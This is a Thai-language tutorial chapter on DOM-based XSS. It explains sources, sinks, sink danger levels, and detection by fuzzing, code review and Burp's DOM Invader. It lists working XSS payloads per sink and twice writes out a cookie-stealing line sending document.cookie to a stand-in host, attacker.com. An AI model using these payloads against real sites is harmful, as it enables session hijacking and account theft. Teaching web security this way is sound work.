# Part 2: DOM-Based XSS Overview
> [Back to Index](README.md) | [Previous: XSS Fundamentals](01-XSS-Fundamentals.md)

---

## DOM XSS คืออะไร?

### ความแตกต่างจาก XSS ปกติ

```
Reflected/Stored XSS:
User Input → Server ประมวลผล → Response → Browser แสดง payload

DOM XSS:
User Input → JavaScript ใน Browser ประมวลผลเอง → XSS execute
                    ↑
            ไม่ผ่าน Server เลย!
```

### ทำไม DOM XSS สำคัญ?

| เหตุผล | คำอธิบาย |
|--------|---------|
| **Bypass WAF** | Server-side WAF ตรวจไม่เจอ เพราะ payload ไม่ผ่าน server |
| **Fragment attacks** | Payload ใน `#` (hash) ไม่ถูกส่งไป server |
| **Client-side only** | ต้องวิเคราะห์ JavaScript ถึงจะหาเจอ |
| **Common in SPAs** | Single Page Apps มักมีช่องโหว่นี้ |

---

## Parse คืออะไร? (ความรู้พื้นฐานก่อนเรียน Source/Sink)

**Parse = การอ่านและแปลความหมายของ code/text**

### ตัวอย่างให้เห็นภาพ

```
Input: "<img src=x onerror=alert(1)>"

┌─────────────────────────────────────────────────────────┐
│                                                         │
│   innerHTML (Parse HTML)                                │
│   ─────────────────────                                 │
│   Browser อ่าน: "อ๋อ นี่คือ <img> tag"                  │
│   Browser ทำ:   สร้าง image element                     │
│   Browser ทำ:   src=x โหลดไม่ได้ → error!              │
│   Browser ทำ:   เรียก onerror → alert(1) 🔴            │
│                                                         │
│   Result: CODE EXECUTES!                                │
│                                                         │
├─────────────────────────────────────────────────────────┤
│                                                         │
│   textContent (ไม่ Parse HTML)                          │
│   ────────────────────────────                          │
│   Browser อ่าน: "นี่คือ text ธรรมดา"                    │
│   Browser ทำ:   แสดง text ตามที่เห็น                    │
│                                                         │
│   Result: แสดง "<img src=x onerror=alert(1)>"          │
│           เป็นตัวอักษรธรรมดา ไม่ execute! ✅            │
│                                                         │
└─────────────────────────────────────────────────────────┘
```

### เปรียบเทียบ Parse vs ไม่ Parse

| | Parse | ไม่ Parse |
|--|-------|-----------|
| **ภาษาไทย** | แปลความหมาย | ไม่แปล แสดงตามที่เห็น |
| **ตัวอย่าง** | `<b>hi</b>` → **hi** (ตัวหนา) | `<b>hi</b>` → `<b>hi</b>` (text) |
| **Sink ที่ใช้** | `innerHTML`, `document.write()` | `textContent`, `innerText` |
| **อันตราย** | ✅ ใช่ (XSS ได้) | ❌ ไม่ (ปลอดภัย) |

### Code Demo

```javascript
var payload = "<img src=x onerror=alert('HACKED!')>";

// innerHTML - Parse HTML
document.getElementById('div1').innerHTML = payload;
// ผลลัพธ์: Browser สร้าง <img> → error → alert('HACKED!') 🔴

// textContent - ไม่ Parse
document.getElementById('div2').textContent = payload;
// ผลลัพธ์: แสดงข้อความ "<img src=x onerror=alert('HACKED!')>" ✅
```

**หน้าจอที่เห็น:**

```
┌──────────────────────────────────────┐
│ div1 (innerHTML):                    │
│ [💥 Alert popup: "HACKED!"]          │
│                                      │
│ div2 (textContent):                  │
│ <img src=x onerror=alert('HACKED!')> │
│ (แสดงเป็น text ธรรมดา)               │
└──────────────────────────────────────┘
```

### สรุป Parse

```
Parse     = Browser อ่านแล้วทำตาม (อันตราย!)
ไม่ Parse = Browser แสดงเป็น text ธรรมดา (ปลอดภัย)

innerHTML    → Parse    → XSS ได้ 🔴
textContent  → ไม่ Parse → ปลอดภัย ✅
```

> **ทำไมต้องรู้เรื่อง Parse?**
> เพราะ Sink ที่ "Parse" คือ Sink ที่อันตราย (ทำให้เกิด XSS)
> Sink ที่ "ไม่ Parse" คือ Sink ที่ปลอดภัย

---

## Source และ Sink

### แนวคิดง่ายๆ

```
Source → ทางเข้าของข้อมูล (Attacker ควบคุมได้)
Sink   → ทางออก/จุดประมวลผล (ที่ทำให้เกิด XSS)

Source ──────► JavaScript Code ──────► Sink
  │                                      │
  │  Attacker's                          │  Code
  │  Input                               │  Executes!
  ▼                                      ▼
```

---

### Source (แหล่งข้อมูล)

**Source = จุดที่ Attacker สามารถใส่ข้อมูลเข้ามาได้**

```javascript
// URL-based Sources (ควบคุมผ่าน URL)
location.search      // ?param=value
location.hash        // #fragment
location.href        // Full URL
location.pathname    // /path/to/page
document.URL         // Full URL
document.documentURI // Full URL

// Referrer
document.referrer    // หน้าก่อนหน้า

// Storage
document.cookie      // Cookies
localStorage.getItem('key')
sessionStorage.getItem('key')

// Web Messaging
postMessage()        // ข้อความจาก window อื่น
window.name          // Window name

// Form Input
document.getElementById('input').value
```

### ตัวอย่าง Source

```
URL: https://target.com/search?q=ATTACKER_INPUT#HASH_INPUT
                                 │                │
                                 ▼                ▼
                          location.search    location.hash
                          = "?q=ATTACKER_INPUT"  = "#HASH_INPUT"
```

**Attacker ควบคุม Source ได้โดย:**
- ส่ง malicious link ให้ victim คลิก
- ใช้ postMessage จาก iframe
- Set cookies (ถ้าทำได้)

---

### Sink (จุดประมวลผล)

**Sink = จุดที่ code execute (ทางออกที่อันตราย)**

```
Sink คือ "ทางออก" ที่ถ้า payload ไปถึง → จะ execute

Source (ทางเข้า)  →  JavaScript  →  Sink (ทางออก)
     │                                    │
 payload เข้า                        payload ทำงาน!
```

### เปรียบเทียบให้เห็นภาพ

```
┌─────────────────────────────────────────────────────────┐
│                                                         │
│   SOURCE = ประตูทางเข้าบ้าน                             │
│            (Attacker ส่ง payload เข้ามา)                │
│                                                         │
│   SINK   = ปลั๊กไฟ / เตาแก๊ส                            │
│            (ถ้า payload ไปถึง → ระเบิด!)                │
│                                                         │
│   ─────────────────────────────────────────────────    │
│                                                         │
│   มีประตู (Source) อย่างเดียว = ยังไม่อันตราย           │
│   มีปลั๊กไฟ (Sink) อย่างเดียว = ยังไม่อันตราย           │
│                                                         │
│   ประตูเปิด + ต่อสายไฟถึงปลั๊ก = ระเบิด! 💥            │
│   (Source → Sink โดยไม่มี filter)                       │
│                                                         │
└─────────────────────────────────────────────────────────┘
```

---

### Sink แต่ละประเภท

#### 🔴 Execution Sinks (อันตรายสุด)

**ทำให้ JavaScript execute โดยตรง:**

```javascript
eval("alert(1)")           // ← payload execute ทันที!
Function("alert(1)")()     // ← สร้าง function แล้ว execute
setTimeout("alert(1)")     // ← execute หลัง delay
setInterval("alert(1)")    // ← execute ซ้ำๆ
```

**Payload ที่ใช้:** แค่ JS code ธรรมดา
```javascript
alert(document.cookie)
fetch('https://attacker.com?c='+document.cookie)
```

---

#### 🔴 HTML Injection Sinks (อันตรายมาก)

**ทำให้ HTML ถูก render → event handlers execute:**

```javascript
element.innerHTML = "<img src=x onerror=alert(1)>"
// ← img ถูกสร้าง → src error → onerror execute!

document.write("<script>alert(1)</script>")
// ← script ถูกเขียน → execute!

element.outerHTML = data      // Replace element
document.writeln(data)        // Write line to document
insertAdjacentHTML(pos, data) // Insert HTML at position
```

**Payload ที่ใช้:** HTML + event handlers
```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
```

**หมายเหตุ:** `<script>` ไม่ทำงานใน `innerHTML` ต้องใช้ event handlers

---

#### 🟠 URL/Navigation Sinks (อันตรายปานกลาง)

**ทำให้ redirect หรือ load javascript: URL:**

```javascript
location.href = "javascript:alert(1)"
// ← redirect ไป javascript: URL → execute!

element.src = "javascript:alert(1)"
// ← load javascript: URL → execute!

window.open("javascript:alert(1)")
// ← เปิด window ใหม่พร้อม execute

location.assign(data)         // Navigate to URL
location.replace(data)        // Navigate (no history)
element.href = data           // Link destination
element.action = data         // Form action
```

**Payload ที่ใช้:** javascript: URL
```
javascript:alert(document.cookie)
javascript:fetch('https://attacker.com?c='+document.cookie)
```

---

#### 🟠 jQuery Sinks

```javascript
$(data)                       // jQuery selector - can execute HTML
$.html(data)                  // Set innerHTML
$.append(data)                // Append HTML
$.prepend(data)               // Prepend HTML
$.after(data)                 // Insert after
$.before(data)                // Insert before
```

**Payload ที่ใช้:** เหมือน innerHTML
```html
<img src=x onerror=alert(1)>
```

---

#### 🟡 Safe Sinks (ปลอดภัย)

**ไม่ parse HTML หรือ execute code:**

```javascript
element.textContent = "<script>alert(1)</script>"
// ← แสดงเป็น text ธรรมดา ไม่ execute!

element.innerText = "<img src=x onerror=alert(1)>"
// ← แสดงเป็น text ธรรมดา ไม่ execute!
```

---

### Sink Danger Levels Summary

| Level | Sink Type | Examples | Payload | ทำไมอันตราย |
|-------|-----------|----------|---------|-------------|
| 🔴 **Critical** | JS Execution | `eval()`, `Function()`, `setTimeout(string)` | `alert(1)` | Execute arbitrary JavaScript |
| 🔴 **High** | HTML Injection | `innerHTML`, `document.write()` | `<img src=x onerror=alert(1)>` | Insert HTML + event handlers |
| 🟠 **Medium** | URL/Navigation | `location.href`, `element.src` | `javascript:alert(1)` | Redirect หรือ load `javascript:` URL |
| 🟠 **Medium** | jQuery | `$()`, `$.html()` | `<img src=x onerror=alert(1)>` | Parse HTML like innerHTML |
| 🟡 **Safe** | Text Content | `textContent`, `innerText` | N/A | แค่แสดง text (ไม่ parse HTML) |

---

### Sink Cheatsheet (วิธีจำ)

```
┌──────────────────────────────────────────────────────┐
│                    SINK CHEATSHEET                   │
├──────────────────────────────────────────────────────┤
│                                                      │
│  🔴 เจอ eval(), Function(), setTimeout(string)      │
│     → Payload: alert(1)                              │
│                                                      │
│  🔴 เจอ innerHTML, document.write()                 │
│     → Payload: <img src=x onerror=alert(1)>         │
│                                                      │
│  🟠 เจอ location.href, element.src                  │
│     → Payload: javascript:alert(1)                   │
│                                                      │
│  🟠 เจอ $(), $.html(), $.append()                   │
│     → Payload: <img src=x onerror=alert(1)>         │
│                                                      │
│  🟡 เจอ textContent, innerText                      │
│     → ปลอดภัย! ไม่ต้องสนใจ                          │
│                                                      │
└──────────────────────────────────────────────────────┘
```

---

### การเชื่อมต่อ Source → Sink

**DOM XSS เกิดเมื่อ: ข้อมูลจาก Source ไหลไป Sink โดยไม่ถูก sanitize**

```javascript
// ตัวอย่าง Vulnerable Code

// Source: location.search → Sink: innerHTML
var search = location.search.substring(1);  // SOURCE
document.getElementById('result').innerHTML = search;  // SINK

// Source: location.hash → Sink: eval
var data = location.hash.substring(1);  // SOURCE
eval(data);  // SINK

// Source: postMessage → Sink: document.write
window.addEventListener('message', function(e) {
    var data = e.data;  // SOURCE
    document.write(data);  // SINK
});
```

---

### Visual Flow

```
┌─────────────────────────────────────────────────────────────┐
│                     DOM XSS Data Flow                       │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│   SOURCE                                          SINK      │
│   (Attacker Input)                            (Execution)   │
│                                                             │
│   ┌─────────────┐      JavaScript       ┌─────────────┐    │
│   │ URL params  │ ──────────────────►   │ eval()      │    │
│   │ location.*  │      Processing       │ innerHTML   │    │
│   │ postMessage │ ◄─── (may filter) ──► │ doc.write() │    │
│   │ cookies     │                       │ location.*  │    │
│   │ storage     │                       │ $.html()    │    │
│   └─────────────┘                       └─────────────┘    │
│         │                                      │            │
│         │    ┌──────────────────────┐          │            │
│         └───►│  If NO sanitization  │◄─────────┘            │
│              │  = XSS VULNERABILITY │                       │
│              └──────────────────────┘                       │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

### Quick Reference Tables

**Sources:**

| Source | ตัวอย่าง URL/Input | Attacker Control |
|--------|-------------------|------------------|
| `location.search` | `?q=PAYLOAD` | URL parameter |
| `location.hash` | `#PAYLOAD` | URL fragment |
| `location.href` | Full URL | ทั้ง URL |
| `document.referrer` | Previous page | Link จากหน้า attacker |
| `postMessage` | Window message | iframe/popup |
| `document.cookie` | Cookies | ถ้า set cookie ได้ |

**Sinks:**

| Sink | อันตราย | Payload ที่ใช้ |
|------|---------|---------------|
| `eval()` | 🔴 Critical | `alert(1)` |
| `innerHTML` | 🔴 High | `<img src=x onerror=alert(1)>` |
| `document.write()` | 🔴 High | `<script>alert(1)</script>` |
| `location.href` | 🟠 Medium | `javascript:alert(1)` |
| `element.src` | 🟠 Medium | `javascript:alert(1)` |
| `$(selector)` | 🟠 Medium | `<img src=x onerror=alert(1)>` |

---

### สรุป Source และ Sink

```
┌────────────────────────────────────────────────────┐
│                SOURCE vs SINK                      │
├────────────────────────────────────────────────────┤
│                                                    │
│  SOURCE = ข้อมูลเข้า (Attacker ควบคุมได้)          │
│           • URL parameters (?q=)                   │
│           • URL hash (#)                           │
│           • postMessage                            │
│           • Cookies                                │
│                                                    │
│  SINK = จุดประมวลผล (ทำให้ code execute)           │
│         • eval(), innerHTML                        │
│         • document.write()                         │
│         • location.href                            │
│                                                    │
│  DOM XSS = Source → Sink โดยไม่ sanitize           │
│                                                    │
└────────────────────────────────────────────────────┘
```

### Source vs Sink Comparison Table

| | Source | Sink |
|--|--------|------|
| **คืออะไร** | ทางเข้าของ payload | ทางออกที่ execute |
| **Attacker ควบคุม** | ✅ ได้ | ❌ ไม่ได้ (อยู่ในโค้ด) |
| **ตัวอย่าง** | `location.search`, `postMessage` | `innerHTML`, `eval()` |
| **หาในโค้ด** | หาว่า input มาจากไหน | หาว่า input ไปไหน |
| **เจออย่างเดียว** | ยังไม่มี XSS | ยังไม่มี XSS |
| **เจอทั้งคู่ + ไม่มี filter** | **XSS! 🔴** | **XSS! 🔴** |

```
XSS = Source ──────► Sink
      (เข้า)         (ออก)
         │             │
    Attacker      Code execute
    ควบคุมได้     ถ้าไปถึงจุดนี้
```

---

## วิธี Identify DOM XSS

### วิธีที่ 1: Fuzzer String

ใส่ string นี้ในทุก input field:

```
<>\'\"<script>{{7*7}}$(alert(1)}"-prompt(69)-"fuzzer
```

**สิ่งที่ต้องสังเกต:**
- อะไร reflect กลับมา?
- อะไรถูก encode?
- อะไรถูก filter/block?
- `{{7*7}}` กลายเป็น `49` ไหม? (AngularJS)

### วิธีที่ 2: Manual Source Code Review

**เปิด DevTools → Sources หรือ View Page Source**

หาคำเหล่านี้:

```javascript
// Dangerous Sinks - ต้องหา!
document.write(
document.writeln(
innerHTML =
outerHTML =
insertAdjacentHTML(
eval(
setTimeout(
setInterval(
Function(
$.html(
$().append(
$(

// Sources - ดูว่ามาจากไหน
location.search
location.hash
location.href
location.pathname
document.referrer
document.URL
window.name
postMessage
localStorage.getItem
sessionStorage.getItem
```

### วิธีที่ 3: DOM Invader (แนะนำ!)

ดูหัวข้อถัดไป

---

## DOM Invader

### DOM Invader คืออะไร?

เครื่องมือใน Burp Browser ที่ช่วยหา DOM XSS อัตโนมัติ

### วิธีใช้งาน

```
1. Burp Suite → Proxy → Open browser

2. เปิด DevTools (F12)

3. ไปที่ tab "DOM Invader"

4. Settings:
   - DOM Invader: ON
   - Canary: "domxss" (หรืออะไรก็ได้)
   - Postmessage interception: ON
   - Prototype pollution: ON (optional)

5. Browse แอปปกติ - คลิกทุกหน้า ทุก function

6. ดูผลใน DOM Invader tab:
   - Sources ที่พบ
   - Sinks ที่ canary ไปถึง
   - Exploitability rating
```

### DOM Invader Features

| Feature | ใช้ทำอะไร |
|---------|----------|
| **Canary injection** | ติดตามว่า input ไปถึง sink ไหน |
| **Sink discovery** | แสดง sinks ทั้งหมดที่เจอ |
| **postMessage testing** | Intercept และแก้ไข web messages |
| **Prototype pollution** | ทดสอบ prototype pollution |
| **Augmented DOM** | แสดง DOM changes real-time |

### ใช้ DOM Invader ทดสอบ postMessage

```
1. DOM Invader จะแสดง messages ที่ intercept ได้

2. คลิกที่ message → Edit

3. แก้ไข payload:
   {
     "type": "load-channel",
     "url": "javascript:alert(1)"
   }

4. คลิก "Replay" เพื่อส่ง message ใหม่

5. ดูว่า payload execute ไหม
```

---

## DOM XSS Patterns

ดู pattern files แยกในโฟลเดอร์ `patterns/`:

| Pattern | File | Description |
|---------|------|-------------|
| 1 | [pattern-1-angularjs.md](patterns/pattern-1-angularjs.md) | AngularJS Template Injection |
| 2 | [pattern-2-document-write.md](patterns/pattern-2-document-write.md) | document.write + location.search |
| 3 | [pattern-3-postmessage-json.md](patterns/pattern-3-postmessage-json.md) | JSON.parse + postMessage |
| 4 | [pattern-4-javascript-url.md](patterns/pattern-4-javascript-url.md) | addEventListener + JavaScript URL |
| 5 | [pattern-5-innerhtml-ads.md](patterns/pattern-5-innerhtml-ads.md) | addEventListener + innerHTML |
| 6 | [pattern-6-reflected-eval.md](patterns/pattern-6-reflected-eval.md) | Reflected DOM XSS (eval) |
| 7 | [pattern-7-cookie-manipulation.md](patterns/pattern-7-cookie-manipulation.md) | Cookie Manipulation |
| 8 | [pattern-8-jquery-hashchange.md](patterns/pattern-8-jquery-hashchange.md) | jQuery hashchange |

---

> **Next:** [patterns/pattern-1-angularjs.md](patterns/pattern-1-angularjs.md) - AngularJS Template Injection
